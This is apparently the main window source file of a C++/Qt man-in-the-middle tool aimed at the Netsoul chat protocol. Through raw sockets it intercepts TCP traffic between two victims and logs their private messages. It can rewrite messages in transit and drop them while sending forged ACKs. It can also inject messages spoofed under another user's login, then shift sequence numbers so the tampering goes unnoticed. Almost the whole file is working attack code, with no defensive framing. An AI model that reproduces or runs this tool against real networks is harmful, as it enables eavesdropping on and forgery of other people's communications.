#include "netsoul.h"
#include "ui_netsoul.h"
#include <QtGui/QInputDialog>
#include <QtGui/QMessageBox>
#include <QtCore/QDate>
#include <QUrl>
#include <string>
#include <cstdio>
#include <sstream>
#include "packet.h"
#include "rawsocket.h"
#include <QThread>
#include "changemessage.h"

Netsoul::Netsoul(MITMInfo & infos, RAWSocket & s, QWidget *parent) : QMainWindow(parent),
        clearQueue(0),
        ui(new Ui::Netsoul),
        portA(0), portB(0),
        deltaA(0), deltaB(0),
        state(NoInterference),
        currentMessageA(NULL),
        info(infos),
        socket(s)
{
    currentNewMessageA = NULL;
    ui->setupUi(this);
    this->ui->activityA->setPlainText("");
    this->ui->activityB->setPlainText("");
    QObject::connect(this->ui->changeMessageA, SIGNAL(clicked()), this, SLOT(startWaitForMessageA()));
    QObject::connect(this->ui->newMessageA, SIGNAL(clicked()), this, SLOT(showNewMessageA()));
    QObject::connect(this->ui->dropMessageA, SIGNAL(clicked()), this, SLOT(dropMessageA()));

    QObject::connect(this->ui->changeMessageB, SIGNAL(clicked()), this, SLOT(startWaitForMessageB()));
    QObject::connect(this->ui->newMessageB, SIGNAL(clicked()), this, SLOT(showNewMessageB()));
    QObject::connect(this->ui->dropMessageB, SIGNAL(clicked()), this, SLOT(dropMessageB()));
}

Netsoul::~Netsoul()
{
    delete ui;
}

void Netsoul::sendTargetAToTargetB(Packet & p)
{
    std::string * msg;

    tcp* pTCP = static_cast<tcp*>(p.getBuffer());

    if ((msg = this->isMessage(p)))
    {
        if (this->state == WaitingForMessageA)
        {
            this->currentMessageA = new ChangeMessage(A, msg, this);
            this->currentMessageA->show();
            this->state = WaitingForTypingA;
            this->ui->changeMessageA->setText("Change next message");
            this->addActivityA(QString("Changing message " + QString(getUser(p)->c_str()) + ": " + QString(msg->c_str()).replace("%20", " ") + "-").toStdString().c_str());
        }
        else if (this->state == DropNextMessageA)
        {
            // Create an ACK and send it
            Packet pACK;
            pACK.append(new tcp, sizeof(tcp));
            tcp* ackTCP = (tcp*)pACK.getBuffer();
            ackTCP->craftTCP(this->info.mymac, pTCP->ip_dst, this->info.macA, pTCP->ip_src,
                             htons(pTCP->dest), htons(pTCP->source), htonl(pTCP->ack_seq), htonl(pTCP->seq) + p.getSizeOfData());
            this->deltaA -= p.getSizeOfData();
            ackTCP->ack = 1;
            ackTCP->psh = 0;

            pACK.computeChecksum();
            this->socket.Write(pACK);
            p.State = Drop;
            this->addActivityA(QString("Message dropped !!! " + QString(getUser(p)->c_str()) + ": " + QString(msg->c_str()).replace("%20", " ")).toStdString().c_str());

            this->state = NoInterference;
        }
        else
            this->addActivityA(QString(QString(getUser(p)->c_str()) + ": " +  QString(msg->c_str()).replace("%20", " ")).toStdString().c_str());
    }


    if (this->state == WaitingForTypingA)
    {
        p.State = Store;
        std::cout << "Packet stored queue.size() : " << Queue.size() << std::endl;
        return;
    }

    pTCP->seq = htonl(htonl(pTCP->seq) + deltaA);
    pTCP->ack_seq = htonl(htonl(pTCP->ack_seq) + deltaB);

}


void Netsoul::sendTargetBToTargetA(Packet & p)
{
    std::string * msg;
    tcp* pTCP = static_cast<tcp*>(p.getBuffer());

    if ((msg = this->isMessage(p)))
    {
        if (this->state == WaitingForMessageB)
        {
            this->currentMessageB = new ChangeMessage(B, msg, this);
            this->currentMessageB->show();
            this->state = WaitingForTypingB;
            this->ui->changeMessageB->setText("Change next message");
            this->addActivityB(QString("Changing message " + QString(getUser(p)->c_str()) + ": " + QString(msg->c_str()).replace("%20", " ") + "-").toStdString().c_str());
        }
        else if (this->state == DropNextMessageB)
        {
            // Create an ACK and send it
            Packet pACK;
            pACK.append(new tcp, sizeof(tcp));
            tcp* ackTCP = (tcp*)pACK.getBuffer();
            ackTCP->craftTCP(this->info.mymac, pTCP->ip_dst, this->info.macB, pTCP->ip_src,
                             htons(pTCP->dest), htons(pTCP->source), htonl(pTCP->ack_seq), htonl(pTCP->seq) + p.getSizeOfData());
            this->deltaB += p.getSizeOfData();
            ackTCP->ack = 1;
            ackTCP->psh = 0;

            pACK.computeChecksum();
            this->socket.Write(pACK);
            p.State = Drop;
            this->addActivityB(QString("Message dropped !!! " + QString(getUser(p)->c_str()) + ": " + QString(msg->c_str()).replace("%20", " ")).toStdString().c_str());

            this->state = NoInterference;
        }
        else
            this->addActivityB(QString(QString(getUser(p)->c_str()) + ": " +  QString(msg->c_str()).replace("%20", " ")).toStdString().c_str());

    }


    if (this->state == WaitingForTypingB)
    {
        p.State = Store;
        return;
    }

    pTCP->seq = htonl(htonl(pTCP->seq) - deltaB);
    pTCP->ack_seq = htonl(htonl(pTCP->ack_seq) - deltaA);
}

std::string *Netsoul::isMessage(Packet & p)
{
    char *data = ((char*)p.getBuffer()) + sizeof(tcp);
    int i;
    std::string *str = new std::string();

    if (!strncmp(NS_SENDMSG, data, strlen(NS_SENDMSG)))
    {
	data += strlen(NS_SENDMSG);
	for (i = 0; data[i]; i++)
        {
            if (!strncmp("msg ", data+i, 4) && i)
            {
                if ((i < 9 || strncmp(NS_SENDMSG, data+i-9, 8)))
                {
                    int end = 0, start = 0;
                    if (data[i+4] != '_')
                        start = 0;
                    else
                    {
                        start += 3;
                        while (data[i+4+start] != '_') start++;
                        start++;
                    }
                    while (data[i + 4 + end] != ' ' && data[i + 4 + end] != '\r' && data[i + 4 + end] != '\n') end++; // if \n or \r stop cause of \r\n & \n (& \r ?)
                    char buffer[end - start + 1];
                    memcpy(buffer, data + i + 4 + start, end - start);
                    buffer[end - start] = 0;
                    *str += (const char *)buffer;
                    return str;
                }
            }
        }
    }
    return NULL;
}

std::string * Netsoul::getUser(Packet & p)
{
    char *data = ((char*)p.getBuffer()) + sizeof(tcp);
    std::string *str = new std::string("");

    unsigned char buffer[p.Size - sizeof(tcp) + 1];
    memcpy(buffer, data, p.Size - sizeof(tcp)); // without \r\n
    buffer[p.Size - sizeof(tcp)] = 0;
    std::string tmp((const char *)buffer);

    std::string part;
    std::stringstream  currentCMD(tmp);
    for(int i = 0; i < 4; i++)
        std::getline(currentCMD, part, ':');

    std::stringstream  currentFragment(part);
    std::getline(currentFragment, part, ' ');
    std::stringstream  currentPart(part);
     std::getline(currentPart, part, '@');
    *str = part;
    return str;
}




bool Netsoul::isProtocol(Packet & p)
{
    char * data = ((char*)p.getBuffer()) + sizeof(tcp);
    const char * begin[] = {"salut", "auth_ag", "list_users", "ping", "user_cmd", "state", "exit", NULL};

    tcp* pTCP = (tcp*)p.getBuffer();
    bool isProtocol = false;
    if (portA && portB)
    {
      if ((pTCP->source == portA && pTCP->dest == portB))
	{
	  this->currentSeqA = pTCP->seq;
	  this->currentSeqB = pTCP->ack_seq;
	  isProtocol = true;
	}
      else if ((pTCP->source == portB && pTCP->dest == portA))
	{
	  this->currentSeqA = pTCP->ack_seq;
	  this->currentSeqB = pTCP->seq;
	  isProtocol = true;
	}
    }
    else
    {
        int i = 0;
        while (begin[i])
        {
            if (!strncmp(begin[i], data, strlen(begin[i])))
            {
	      portB = htons(4242);
	      portA = (htons(pTCP->source) != 4242) ? pTCP->source : pTCP->dest;
	      info.nssIp = (htons(pTCP->source) != 4242) ? pTCP->ip_dst : pTCP->ip_src;
	      isProtocol = true;
            }
            i++;
        }
    }
    return isProtocol;
}

void Netsoul::addActivityA(const char * message)
{
    QString mess(message);
    this->ui->activityA->setPlainText("\n" + QTime::currentTime().toString() + " > " + mess + this->ui->activityA->toPlainText() );
}

void Netsoul::addActivityB(const char * message)
{
    QString mess(message);
    this->ui->activityB->setPlainText("\n" + QTime::currentTime().toString() + " > " + mess + this->ui->activityB->toPlainText());
}


void Netsoul::hasMessageA()
{
    Packet* p = *(this->Queue.begin());

    char * data = ((char*)p->getBuffer()) + sizeof(tcp);
    unsigned char buffer[p->Size - sizeof(tcp) + 1];
    memcpy(buffer, data, p->Size - sizeof(tcp));
    buffer[p->Size - sizeof(tcp)] = 0;
    QString  tmp((const char *)buffer);
    QString newstring = this->currentMessageA->getMessage();

    newstring = newstring.replace(" ", "%20");
    QString res = tmp.replace(this->currentMessageA->OriginalMessage, newstring);

    this->addActivityA(QString("replace(" + this->currentMessageA->OriginalMessage + ", " + newstring + ") = " + res).toStdString().c_str());

    p->reduce(p->Size - sizeof(tcp));
    p->append(res.toStdString().c_str(), res.length());
    NextDelta = -(this->currentMessageA->OriginalMessage.length() - newstring.length());

    clearQueue = 1;
    this->state = NoInterference;

    delete this->currentMessageA;
    this->currentMessageA = NULL;
}


void Netsoul::hasMessageB()
{
    Packet* p = *(this->Queue.begin());

    char * data = ((char*)p->getBuffer()) + sizeof(tcp);
    unsigned char buffer[p->Size - sizeof(tcp) + 1];
    memcpy(buffer, data, p->Size - sizeof(tcp));
    buffer[p->Size - sizeof(tcp)] = 0;
    QString  tmp((const char *)buffer);
    QString newstring = this->currentMessageB->getMessage();

    newstring = newstring.replace(" ", "%20");
    QString res = tmp.replace(this->currentMessageB->OriginalMessage, newstring);

    this->addActivityB(QString("replace(" + this->currentMessageB->OriginalMessage + ", " + newstring + ")").toStdString().c_str());

    p->reduce(p->Size - sizeof(tcp));
    p->append(res.toStdString().c_str(), res.length());
    NextDelta = -(this->currentMessageB->OriginalMessage.length() - newstring.length());

    clearQueue = 2;
    this->state = NoInterference;

    delete this->currentMessageB;
    this->currentMessageB = NULL;
}

void Netsoul::sendNewMessageA()
{
    Packet test;
    test.append(new tcp, sizeof(tcp));

    tcp* testTCP = (tcp*)test.getBuffer();

    testTCP->craftTCP(this->info.mymac, this->info.ipA, this->info.macB, this->info.nssIp,
		      htons(this->portA), htons(this->portB), htonl(this->currentSeqA), htonl(this->currentSeqB));

    QString login = this->currentNewMessageA->getLogin();
    QString msg = this->currentNewMessageA->getMessage().replace(" ", "%20");

    test.append("user_cmd msg *:", 15);
    test.append(login.toStdString().c_str(), login.length());
    test.append("@*Unknown%20Location%20On%20SameSoul* msg ", 42);
    test.append(msg.toStdString().c_str(), msg.length());
    test.append("\r\n", 2);
    testTCP = (tcp*)test.getBuffer();
    testTCP->psh = 1;
    testTCP->ack = 1;
    testTCP->ip_len = htons(test.Size - sizeof(eth));
    test.computeChecksum();
    this->socket.Write(test);
    deltaA += test.getSizeOfData();
    delete this->currentNewMessageA;
    this->currentNewMessageA = NULL;
}

void Netsoul::startWaitForMessageA()
{
    this->state = WaitingForMessageA;
    this->ui->changeMessageA->setText("Stop wait");
}

void Netsoul::showNewMessageA()
{
    if (this->currentNewMessageA == NULL)
    {
       this->currentNewMessageA = new ChangeMessage(A, new std::string(""), this);
       this->currentNewMessageA->show();
    }
}

void Netsoul::dropMessageA()
{
    this->state = DropNextMessageA;
}

void Netsoul::startWaitForMessageB()
{
    this->state = WaitingForMessageB;
    this->ui->changeMessageB->setText("Stop wait");
}

void Netsoul::showNewMessageB()
{
    if (this->currentNewMessageA == NULL)
    {
       this->currentNewMessageB = new ChangeMessage(B, new std::string(""), this);
       this->currentNewMessageB->show();
    }
}

void Netsoul::dropMessageB()
{
    this->state = DropNextMessageB;
}

